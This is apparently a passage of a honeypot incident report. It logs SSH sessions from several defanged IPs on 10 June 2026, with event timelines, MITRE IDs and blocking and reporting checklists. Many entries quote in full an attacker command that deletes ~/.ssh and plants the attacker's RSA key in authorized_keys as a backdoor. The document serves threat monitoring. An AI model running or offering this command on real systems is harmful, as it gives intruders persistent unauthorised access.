| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 05:35 |
| **Last Seen** | 2026-06-10 05:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:35:41` | `cowrie.session.connect` |
| `2026-06-10 05:35:41` | `cowrie.client.version` |
| `2026-06-10 05:35:41` | `cowrie.client.kex` |
| `2026-06-10 05:35:42` | `cowrie.login.success` |
| `2026-06-10 05:35:42` | `cowrie.session.params` |
| `2026-06-10 05:35:42` | `cowrie.command.input` |
| `2026-06-10 05:35:42` | `cowrie.command.failed` |
| `2026-06-10 05:35:43` | `cowrie.log.closed` |
| `2026-06-10 05:35:43` | `cowrie.session.params` |
| `2026-06-10 05:35:43` | `cowrie.command.input` |
| `2026-06-10 05:35:43` | `cowrie.session.file_download` |
| `2026-06-10 05:35:43` | `cowrie.log.closed` |
| `2026-06-10 05:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8ae97df2a63

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 05:35 |
| **Last Seen** | 2026-06-10 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:35:45` | `cowrie.session.connect` |
| `2026-06-10 05:35:45` | `cowrie.client.version` |
| `2026-06-10 05:35:45` | `cowrie.client.kex` |
| `2026-06-10 05:35:46` | `cowrie.login.success` |
| `2026-06-10 05:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a8f4dfffc64

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 05:37 |
| **Last Seen** | 2026-06-10 05:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:37:51` | `cowrie.session.connect` |
| `2026-06-10 05:37:51` | `cowrie.client.version` |
| `2026-06-10 05:37:52` | `cowrie.client.kex` |
| `2026-06-10 05:37:52` | `cowrie.login.success` |
| `2026-06-10 05:37:52` | `cowrie.session.params` |
| `2026-06-10 05:37:52` | `cowrie.command.input` |
| `2026-06-10 05:37:52` | `cowrie.command.failed` |
| `2026-06-10 05:37:53` | `cowrie.log.closed` |
| `2026-06-10 05:37:53` | `cowrie.session.params` |
| `2026-06-10 05:37:53` | `cowrie.command.input` |
| `2026-06-10 05:37:53` | `cowrie.session.file_download` |
| `2026-06-10 05:37:53` | `cowrie.log.closed` |
| `2026-06-10 05:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e27d58be5b5

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 05:37 |
| **Last Seen** | 2026-06-10 05:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:37:55` | `cowrie.session.connect` |
| `2026-06-10 05:37:55` | `cowrie.client.version` |
| `2026-06-10 05:37:55` | `cowrie.client.kex` |
| `2026-06-10 05:37:56` | `cowrie.login.success` |
| `2026-06-10 05:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3f060402110

| Field | Detail |
|---|---|
| **Source IP** | `200.58.83[.]79` |
| **First Seen** | 2026-06-10 05:38 |
| **Last Seen** | 2026-06-10 05:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:38:37` | `cowrie.session.connect` |
| `2026-06-10 05:38:38` | `cowrie.client.version` |
| `2026-06-10 05:38:38` | `cowrie.client.kex` |
| `2026-06-10 05:38:42` | `cowrie.login.success` |
| `2026-06-10 05:38:43` | `cowrie.direct-tcpip.request` |
| `2026-06-10 05:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.58.83[.]79` to AbuseIPDB if not already reported
- [ ] Block `200.58.83[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9adb7751b7ec

| Field | Detail |
|---|---|
| **Source IP** | `60.174.35[.]18` |
| **First Seen** | 2026-06-10 05:38 |
| **Last Seen** | 2026-06-10 05:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:38:48` | `cowrie.session.connect` |
| `2026-06-10 05:38:50` | `cowrie.client.version` |
| `2026-06-10 05:38:50` | `cowrie.client.kex` |
| `2026-06-10 05:38:53` | `cowrie.login.success` |
| `2026-06-10 05:38:53` | `cowrie.direct-tcpip.request` |
| `2026-06-10 05:38:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.35[.]18` to AbuseIPDB if not already reported
- [ ] Block `60.174.35[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6eb0e3be2f4

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 05:40 |
| **Last Seen** | 2026-06-10 05:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:40:06` | `cowrie.session.connect` |
| `2026-06-10 05:40:06` | `cowrie.client.version` |
| `2026-06-10 05:40:06` | `cowrie.client.kex` |
| `2026-06-10 05:40:07` | `cowrie.login.success` |
| `2026-06-10 05:40:07` | `cowrie.session.params` |
| `2026-06-10 05:40:07` | `cowrie.command.input` |
| `2026-06-10 05:40:07` | `cowrie.command.failed` |
| `2026-06-10 05:40:07` | `cowrie.log.closed` |
| `2026-06-10 05:40:08` | `cowrie.session.params` |
| `2026-06-10 05:40:08` | `cowrie.command.input` |
| `2026-06-10 05:40:08` | `cowrie.session.file_download` |
| `2026-06-10 05:40:08` | `cowrie.log.closed` |
| `2026-06-10 05:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d77f40c3d54b

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 05:40 |
| **Last Seen** | 2026-06-10 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:40:10` | `cowrie.session.connect` |
| `2026-06-10 05:40:10` | `cowrie.client.version` |
| `2026-06-10 05:40:10` | `cowrie.client.kex` |
| `2026-06-10 05:40:11` | `cowrie.login.success` |
| `2026-06-10 05:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8905d2a386b9

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 05:43 |
| **Last Seen** | 2026-06-10 05:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:43:46` | `cowrie.session.connect` |
| `2026-06-10 05:43:46` | `cowrie.client.version` |
| `2026-06-10 05:43:46` | `cowrie.client.kex` |
| `2026-06-10 05:43:47` | `cowrie.login.success` |
| `2026-06-10 05:43:47` | `cowrie.session.params` |
| `2026-06-10 05:43:47` | `cowrie.command.input` |
| `2026-06-10 05:43:47` | `cowrie.command.failed` |
| `2026-06-10 05:43:48` | `cowrie.log.closed` |
| `2026-06-10 05:43:48` | `cowrie.session.params` |
| `2026-06-10 05:43:48` | `cowrie.command.input` |
| `2026-06-10 05:43:48` | `cowrie.session.file_download` |
| `2026-06-10 05:43:48` | `cowrie.log.closed` |
| `2026-06-10 05:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d97f18bf0c2

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 05:43 |
| **Last Seen** | 2026-06-10 05:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:43:50` | `cowrie.session.connect` |
| `2026-06-10 05:43:50` | `cowrie.client.version` |
| `2026-06-10 05:43:50` | `cowrie.client.kex` |
| `2026-06-10 05:43:51` | `cowrie.login.success` |
| `2026-06-10 05:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fce7572f6e7

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 05:48 |
| **Last Seen** | 2026-06-10 05:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:48:38` | `cowrie.session.connect` |
| `2026-06-10 05:48:38` | `cowrie.client.version` |
| `2026-06-10 05:48:38` | `cowrie.client.kex` |
| `2026-06-10 05:48:39` | `cowrie.login.success` |
| `2026-06-10 05:48:39` | `cowrie.session.params` |
| `2026-06-10 05:48:39` | `cowrie.command.input` |
| `2026-06-10 05:48:39` | `cowrie.command.failed` |
| `2026-06-10 05:48:40` | `cowrie.log.closed` |
| `2026-06-10 05:48:40` | `cowrie.session.params` |
| `2026-06-10 05:48:40` | `cowrie.command.input` |
| `2026-06-10 05:48:40` | `cowrie.session.file_download` |
| `2026-06-10 05:48:40` | `cowrie.log.closed` |
| `2026-06-10 05:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abab90811322

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 05:48 |
| **Last Seen** | 2026-06-10 05:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:48:42` | `cowrie.session.connect` |
| `2026-06-10 05:48:42` | `cowrie.client.version` |
| `2026-06-10 05:48:42` | `cowrie.client.kex` |
| `2026-06-10 05:48:43` | `cowrie.login.success` |
| `2026-06-10 05:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c657a34ba88

| Field | Detail |
|---|---|
| **Source IP** | `114.130.85[.]36` |
| **First Seen** | 2026-06-10 05:50 |
| **Last Seen** | 2026-06-10 05:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:50:29` | `cowrie.session.connect` |
| `2026-06-10 05:50:29` | `cowrie.client.version` |
| `2026-06-10 05:50:29` | `cowrie.client.kex` |
| `2026-06-10 05:50:30` | `cowrie.login.success` |
| `2026-06-10 05:50:30` | `cowrie.session.params` |
| `2026-06-10 05:50:30` | `cowrie.command.input` |
| `2026-06-10 05:50:30` | `cowrie.command.failed` |
| `2026-06-10 05:50:30` | `cowrie.log.closed` |
| `2026-06-10 05:50:30` | `cowrie.session.params` |
| `2026-06-10 05:50:30` | `cowrie.command.input` |
| `2026-06-10 05:50:30` | `cowrie.session.file_download` |
| `2026-06-10 05:50:30` | `cowrie.log.closed` |
| `2026-06-10 05:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.130.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `114.130.85[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9da974ce0fe7

| Field | Detail |
|---|---|
| **Source IP** | `114.130.85[.]36` |
| **First Seen** | 2026-06-10 05:50 |
| **Last Seen** | 2026-06-10 05:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:50:32` | `cowrie.session.connect` |
| `2026-06-10 05:50:32` | `cowrie.client.version` |
| `2026-06-10 05:50:32` | `cowrie.client.kex` |
| `2026-06-10 05:50:33` | `cowrie.login.success` |
| `2026-06-10 05:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.130.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `114.130.85[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8ed2764aeae

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 05:54 |
| **Last Seen** | 2026-06-10 05:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:54:23` | `cowrie.session.connect` |
| `2026-06-10 05:54:23` | `cowrie.client.version` |
| `2026-06-10 05:54:23` | `cowrie.client.kex` |
| `2026-06-10 05:54:24` | `cowrie.login.success` |
| `2026-06-10 05:54:24` | `cowrie.session.params` |
| `2026-06-10 05:54:24` | `cowrie.command.input` |
| `2026-06-10 05:54:24` | `cowrie.command.failed` |
| `2026-06-10 05:54:24` | `cowrie.log.closed` |
| `2026-06-10 05:54:24` | `cowrie.session.params` |
| `2026-06-10 05:54:24` | `cowrie.command.input` |
| `2026-06-10 05:54:24` | `cowrie.session.file_download` |
| `2026-06-10 05:54:24` | `cowrie.log.closed` |
| `2026-06-10 05:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6325e3174d88

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 05:54 |
| **Last Seen** | 2026-06-10 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:54:26` | `cowrie.session.connect` |
| `2026-06-10 05:54:26` | `cowrie.client.version` |
| `2026-06-10 05:54:26` | `cowrie.client.kex` |
| `2026-06-10 05:54:26` | `cowrie.login.success` |
| `2026-06-10 05:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84da58cc3888

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 05:55 |
| **Last Seen** | 2026-06-10 05:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:55:29` | `cowrie.session.connect` |
| `2026-06-10 05:55:29` | `cowrie.client.version` |
| `2026-06-10 05:55:29` | `cowrie.client.kex` |
| `2026-06-10 05:55:30` | `cowrie.login.success` |
| `2026-06-10 05:55:30` | `cowrie.session.params` |
| `2026-06-10 05:55:30` | `cowrie.command.input` |
| `2026-06-10 05:55:30` | `cowrie.command.failed` |
| `2026-06-10 05:55:30` | `cowrie.log.closed` |
| `2026-06-10 05:55:31` | `cowrie.session.params` |
| `2026-06-10 05:55:31` | `cowrie.command.input` |
| `2026-06-10 05:55:31` | `cowrie.session.file_download` |
| `2026-06-10 05:55:31` | `cowrie.log.closed` |
| `2026-06-10 05:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de95a59ac42d

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 05:55 |
| **Last Seen** | 2026-06-10 05:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
